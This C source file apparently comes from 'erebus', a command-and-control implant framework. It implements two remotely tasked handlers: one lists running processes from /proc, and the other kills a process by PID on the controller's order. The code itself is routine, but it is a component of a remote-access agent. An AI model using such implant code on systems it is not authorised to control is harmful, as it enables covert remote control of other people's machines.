#define _GNU_SOURCE
#include <ctype.h>
#include <dirent.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include "erebus/pb_c2.h"
#include "erebus/task_handlers.h"

static void parse_stat(const char *stat, erebus_process_info *info) {
    /* pid (name) state ppid ... */
    const char *start = strchr(stat, '(');
    const char *end = strrchr(stat, ')');
    if (!start || !end || end <= start) return;
    size_t nlen = (size_t)(end - start - 1);
    if (nlen >= sizeof(info->name)) nlen = sizeof(info->name) - 1;
    memcpy(info->name, start + 1, nlen);
    info->name[nlen] = '\0';

    const char *rest = end + 2;
    /* skip state */
    while (*rest && !isspace((unsigned char)*rest)) rest++;
    while (*rest && isspace((unsigned char)*rest)) rest++;
    /* ppid */
    info->ppid = (uint32_t)strtoul(rest, NULL, 10);
}

int erebus_task_process_list(uint8_t **out, size_t *out_len) {
    DIR *d = opendir("/proc");
    if (!d) return 0;

    size_t cap = 64, count = 0;
    erebus_process_info *procs = (erebus_process_info *)calloc(cap, sizeof(*procs));
    if (!procs) { closedir(d); return 0; }

    struct dirent *ent;
    while ((ent = readdir(d)) != NULL) {
        if (!isdigit((unsigned char)ent->d_name[0])) continue;
        uint32_t pid = (uint32_t)strtoul(ent->d_name, NULL, 10);
        if (!pid) continue;

        char path[64];
        snprintf(path, sizeof(path), "/proc/%s/stat", ent->d_name);
        FILE *f = fopen(path, "r");
        if (!f) continue;
        char line[1024];
        if (!fgets(line, sizeof(line), f)) { fclose(f); continue; }
        fclose(f);

        if (count >= cap) {
            cap *= 2;
            erebus_process_info *n = (erebus_process_info *)realloc(procs, cap * sizeof(*procs));
            if (!n) { free(procs); closedir(d); return 0; }
            procs = n;
        }
        memset(&procs[count], 0, sizeof(procs[count]));
        procs[count].pid = pid;
        parse_stat(line, &procs[count]);
        count++;
    }
    closedir(d);

    int ok = erebus_pb_encode_process_list_result(procs, count, out, out_len);
    free(procs);
    return ok;
}

int erebus_task_process_kill(const uint8_t *data, size_t data_len, uint8_t **out, size_t *out_len) {
    erebus_process_kill_task task;
    if (!erebus_pb_decode_process_kill_task(data, data_len, &task) || !task.pid)
        return 0;
    int ok = (kill((pid_t)task.pid, SIGKILL) == 0) ? 1 : 0;
    return erebus_pb_encode_process_kill_result(ok, out, out_len);
}
